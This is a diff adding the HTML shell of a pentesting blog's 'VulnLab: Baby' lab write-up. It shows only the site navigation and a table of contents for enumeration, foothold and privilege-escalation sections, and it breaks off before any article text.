@@ -1,0 +1,2073 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/29/vulnlab-baby.html">
+      
+      
+        <link rel="prev" href="../28/vulnlab-manage.html">
+      
+      
+        <link rel="next" href="../../07/04/vulnlab-retro.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>VulnLab: Baby - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="VulnLab: Baby - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-baby.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/29/vulnlab-baby.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="VulnLab: Baby - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-baby.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vulnlab-baby" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              VulnLab: Baby
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../references/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About Me
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-footprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service footprinting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service footprinting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
